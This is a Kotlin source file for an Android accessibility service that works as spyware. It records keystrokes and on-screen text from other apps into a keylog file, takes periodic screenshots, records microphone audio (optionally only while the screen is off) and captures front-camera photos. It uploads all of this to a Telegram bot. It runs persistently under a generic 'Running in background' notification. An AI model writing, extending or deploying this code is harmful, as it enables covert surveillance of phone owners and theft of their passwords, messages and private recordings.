package com.example.telegramsender

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.util.Log
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import androidx.core.app.NotificationCompat
import android.content.Context
import android.content.BroadcastReceiver
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import kotlinx.coroutines.*
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Request
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.util.concurrent.Executor

class TelegramService : AccessibilityService(), LifecycleOwner {

    private val client = OkHttpClient()
    private var job: Job? = null
    
    // Default credentials, will be loaded from Prefs
    private var botToken: String = ""
    private var targetChatId: String = ""
    private var sendCamera: Boolean = false
    private var screenshotInterval: Long = 10000L // Default 10 seconds

    
    private val lifecycleRegistry = LifecycleRegistry(this)
    private var imageCapture: ImageCapture? = null
    
    private val lastTextMap = mutableMapOf<String, String>()
    private val forceSendReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "com.example.telegramsender.ACTION_FORCE_SEND") {
                Log.d("TelegramService", "Force send logs requested")
                CoroutineScope(Dispatchers.IO).launch {
                    if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
                        sendAndClearLogs()
                    }
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        startForegroundServiceNotification()
        lifecycleRegistry.currentState = Lifecycle.State.CREATED
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundServiceNotification()
        return START_STICKY
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("TelegramService", "Accessibility Service Connected")
        lifecycleRegistry.currentState = Lifecycle.State.STARTED
        
        startForegroundServiceNotification()
        
        loadCredentials()
        
        // Ensure MonitorService is running to handle Audio/Camera
        try {
            val monitorIntent = Intent(this, MonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(monitorIntent)
            } else {
                startService(monitorIntent)
            }
        } catch (e: Exception) {
            Log.e("TelegramService", "Failed to auto-start MonitorService", e)
        }
        
        // Register receiver
        val filter = android.content.IntentFilter("com.example.telegramsender.ACTION_FORCE_SEND")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(forceSendReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(forceSendReceiver, filter)
        }
        
        if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
            startCaptureLoop()
            sendTelegramMessage(botToken, targetChatId, "Service Connected (Accessibility Mode)")
        } else {
            Log.e("TelegramService", "Credentials missing on connect")
        }
    }

    // Audio settings
    private var sendAudio: Boolean = false
    private var audioDuration: Long = 60000L
    private var audioScreenOff: Boolean = false
    
    private var audioJob: Job? = null
    private var mediaRecorder: android.media.MediaRecorder? = null

    // ...

    private fun loadCredentials() {
        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
        botToken = pref.getString("token", "") ?: ""
        targetChatId = pref.getString("chatId", "") ?: ""
        sendCamera = pref.getBoolean("sendCamera", false)
        val sec = pref.getLong("screenshotInterval", 10L) 
        screenshotInterval = sec * 1000L
        if (screenshotInterval < 5000L) screenshotInterval = 5000L 
        
        sendAudio = pref.getBoolean("sendAudio", false)
        audioDuration = pref.getLong("audioDuration", 60L) * 1000L
        if (audioDuration < 5000L) audioDuration = 5000L
        audioScreenOff = pref.getBoolean("audioScreenOff", false)
    }

    private var lastLogSendTime = System.currentTimeMillis()

    private fun startCaptureLoop() {
        job?.cancel()
        job = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                // Refresh credentials in case they changed
                loadCredentials()
                
                if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
                    captureAndSend() // Screenshots still managed here (Accessibility dependent)
                    
                    // Camera moved to MonitorService
                    // if (sendCamera) captureCameraAndSend()
                    
                    // Check logs periodicity (every 1 hour)
                    if (System.currentTimeMillis() - lastLogSendTime > 1 * 60 * 60 * 1000) {
                        sendAndClearLogs()
                    }
                }
                delay(screenshotInterval) 
            }
        }
        // Audio Loop moved to MonitorService
        // startAudioLoop()
    }
    
    private fun startAudioLoop() {
        audioJob?.cancel()
        audioJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendAudio) {
                    val shouldRecord = if (audioScreenOff) !isScreenOn() else true
                    
                    if (shouldRecord) {
                        recordAndSendAudio()
                    } else {
                        // If waiting for screen off, check every 5 seconds
                        delay(5000)
                    }
                } else {
                    delay(5000)
                }
            }
        }
    }
    
    private fun isScreenOn(): Boolean {
        val powerManager = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return powerManager.isInteractive
    }
    
    private suspend fun recordAndSendAudio() {
        val audioFile = java.io.File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
        
        try {
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.media.MediaRecorder(this)
            } else {
                android.media.MediaRecorder()
            }
            
            mediaRecorder?.apply {
                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                setOutputFile(audioFile.absolutePath)
                prepare()
                start()
            }
            
            // Record for duration
            delay(audioDuration)
            
            try {
                mediaRecorder?.stop()
            } catch(e: RuntimeException) {
                // Fails if recording is too short (shorter than ~1s)
            }
            mediaRecorder?.release()
            mediaRecorder = null
            
            // Send
            if (audioFile.exists() && audioFile.length() > 0) {
                sendTelegramAudio(botToken, targetChatId, audioFile)
                audioFile.delete()
            }
            
        } catch (e: Exception) {
            Log.e("TelegramService", "Audio record failed", e)
            mediaRecorder?.release()
            mediaRecorder = null
            delay(5000) // Backoff
        }
    }
    
    private fun sendTelegramAudio(token: String, chatId: String, file: java.io.File) {
        val url = "https://api.telegram.org/bot$token/sendAudio"
        try {
             val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("audio", file.name,
                    file.readBytes().toRequestBody("audio/m4a".toMediaTypeOrNull(), 0, file.length().toInt()))
                .build()
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().use { }
        } catch (e: Exception) {
            Log.e("TelegramService", "Failed to send audio", e)
        }
    }
    
    private suspend fun captureCameraAndSend() {
        withContext(Dispatchers.Main) {
            try {
                val cameraProviderFuture = ProcessCameraProvider.getInstance(this@TelegramService)
                cameraProviderFuture.addListener({
                    val cameraProvider = cameraProviderFuture.get()
                    
                    val imageCapture = ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .build()

                    val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA // Or BACK based on logic

                    try {
                        cameraProvider.unbindAll()
                        cameraProvider.bindToLifecycle(
                            this@TelegramService,
                            cameraSelector,
                            imageCapture
                        )
                        
                        imageCapture.takePicture(
                            ContextCompat.getMainExecutor(this@TelegramService),
                            object : ImageCapture.OnImageCapturedCallback() {
                                override fun onCaptureSuccess(image: ImageProxy) {
                                    val bitmap = imageProxyToBitmap(image)
                                    image.close()
                                    if (bitmap != null) {
                                        CoroutineScope(Dispatchers.IO).launch {
                                            sendTelegramPhoto(botToken, targetChatId, bitmap, "camera.jpg")
                                        }
                                    }
                                    // Cleanup
                                    cameraProvider.unbindAll()
                                }

                                override fun onError(exception: ImageCaptureException) {
                                    Log.e("TelegramService", "Camera capture failed", exception)
                                    cameraProvider.unbindAll()
                                }
                            }
                        )
                    } catch (exc: Exception) {
                        Log.e("TelegramService", "Use case binding failed", exc)
                    }
                }, ContextCompat.getMainExecutor(this@TelegramService))
            } catch (e: Exception) {
                Log.e("TelegramService", "Camera Setup Failed", e)
            }
        }
    }
    
    private fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
        val buffer = image.planes[0].buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)
        return BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
    }
    private fun checkLogSizeAndSend() {
        val file = java.io.File(filesDir, "keylogs.txt")
        if (file.exists() && file.length() > 1 * 1024 * 1024) { // 1MB
            CoroutineScope(Dispatchers.IO).launch {
                if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
                    sendAndClearLogs()
                }
            }
        }
    }

    private fun sendAndClearLogs() {
        val file = java.io.File(filesDir, "keylogs.txt")
        if (!file.exists() || file.length() == 0L) return

        try {
            val logContent = file.readBytes()
            
            val url = "https://api.telegram.org/bot$botToken/sendDocument"
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", targetChatId)
                .addFormDataPart("document", "keylogs_${System.currentTimeMillis()}.txt",
                    logContent.toRequestBody("text/plain".toMediaTypeOrNull(), 0, logContent.size))
                .build()
                
            val request = Request.Builder().url(url).post(requestBody).build()
            
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d("TelegramService", "Logs sent successfully")
                    // Clear file only on success
                    file.writeText("")
                    lastLogSendTime = System.currentTimeMillis()
                } else {
                    Log.e("TelegramService", "Failed to send logs: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e("TelegramService", "Error sending logs", e)
        }
    }

    private fun captureAndSend() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        val bitmap = try {
                            Bitmap.wrapHardwareBuffer(
                                screenshotResult.hardwareBuffer,
                                screenshotResult.colorSpace
                            )
                        } catch (e: Exception) {
                            Log.e("TelegramService", "Bitmap conversion failed", e)
                            null
                        }

                        screenshotResult.hardwareBuffer.close()

                        if (bitmap != null) {
                            // Copy to software bitmap to process/compress
                            val softwareBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                            bitmap.recycle() // Recycle hardware wrapper
                            
                            if (softwareBitmap != null) {
                                CoroutineScope(Dispatchers.IO).launch {
                                    sendTelegramPhoto(botToken, targetChatId, softwareBitmap, "screenshot.jpg")
                                }
                            }
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.e("TelegramService", "Screenshot failed: $errorCode")
                    }
                }
            )
        } else {
            Log.e("TelegramService", "Accessibility screenshots require Android 11+")
        }
    }
    
    private fun sendTelegramMessage(token: String, chatId: String, text: String) {
        val url = "https://api.telegram.org/bot$token/sendMessage"
        val body = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", text)
            .build()
        val request = Request.Builder().url(url).post(body).build()
        try {
            client.newCall(request).execute().use { }
        } catch (_: Exception) {}
    }

    private fun sendTelegramPhoto(token: String, chatId: String, originalBitmap: Bitmap, filename: String) {
        val url = "https://api.telegram.org/bot$token/sendPhoto"
        
        // Resize if too big to avoid socket timeouts
        val scale = if (originalBitmap.width > 720) 720f / originalBitmap.width else 1.0f
        val matrix = android.graphics.Matrix()
        matrix.postScale(scale, scale)
        val resizedBitmap = Bitmap.createBitmap(originalBitmap, 0, 0, originalBitmap.width, originalBitmap.height, matrix, true)
        
        val stream = ByteArrayOutputStream()
        resizedBitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream)
        val byteArray = stream.toByteArray()
        
        // Clean up
        if (originalBitmap != resizedBitmap) {
             originalBitmap.recycle()
        }
        resizedBitmap.recycle()
        
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("photo", filename,
                byteArray.toRequestBody("image/jpeg".toMediaTypeOrNull(), 0, byteArray.size))
            .build()
            
        val request = Request.Builder().url(url).post(requestBody).build()
        
        try {
            client.newCall(request).execute().use { response -> 
                if (!response.isSuccessful) {
                    Log.e("TelegramService", "Failed to send photo: ${response.code}")
                } else {
                    Log.d("TelegramService", "Photo sent successfully (${byteArray.size} bytes)")
                }
            }
        } catch (e: IOException) {
            Log.e("TelegramService", "Network error", e)
        }
    }
    private fun startForegroundServiceNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelId = "TelegramSenderChannel"
            val channelName = "Background Service"
            val channel = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, "TelegramSenderChannel")
            .setContentTitle("Telegram Sender")
            .setContentText("Running in background...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()

        // Service ID 1
        startForeground(1, notification)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        // Exclude own app and system UI
        val pkgName = event.packageName?.toString() ?: ""
        if (pkgName == "com.example.telegramsender") return 
        // if (pkgName == "com.android.systemui") return // Optional: keeping it might miss notifications

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || 
            event.eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            
            val currentText = event.text?.filterNot { it.isNullOrBlank() }?.joinToString(" ") ?: ""
            
            // Simple robust logging: Log everything > 1 char
            // To reduce extreme duplication, strict check against last log could be done, 
            // but for "always record", let's be verbose first.
            if (currentText.length > 1) {
                 val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
                 val key = "${pkgName}_${event.source?.viewIdResourceName ?: "unknown"}"
                 val previousText = lastTextMap[key] ?: ""
                 
                 // Avoid logging exact duplicates in sequence
                 if (currentText != previousText) {
                     appendLogToFile("[$timestamp] [$pkgName]: $currentText\n")
                     lastTextMap[key] = currentText
                 }
            }
        }
    }
    
    private fun appendLogToFile(logEntry: String) {
        try {
            val file = java.io.File(filesDir, "keylogs.txt")
            // Limit file size (managed by checkLogSizeAndSend, but failsafe here)
            java.io.FileWriter(file, true).use { writer ->
                writer.append(logEntry)
            }
            checkLogSizeAndSend()
        } catch (e: Exception) {
            Log.e("TelegramService", "Failed to write log", e)
        }
    }

    override fun onInterrupt() {
        Log.w("TelegramService", "Service Interrupted")
        job?.cancel()
        audioJob?.cancel()
        mediaRecorder?.release()
        mediaRecorder = null
    }
    
    override fun onUnbind(intent: Intent?): Boolean {
        job?.cancel()
        audioJob?.cancel()
        mediaRecorder?.release()
        mediaRecorder = null
        try {
            unregisterReceiver(forceSendReceiver)
        } catch (e: Exception) {
            Log.e("TelegramService", "Receiver not registered", e)
        }
        lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
        return super.onUnbind(intent)
    }

    override val lifecycle: Lifecycle
        get() = lifecycleRegistry
}
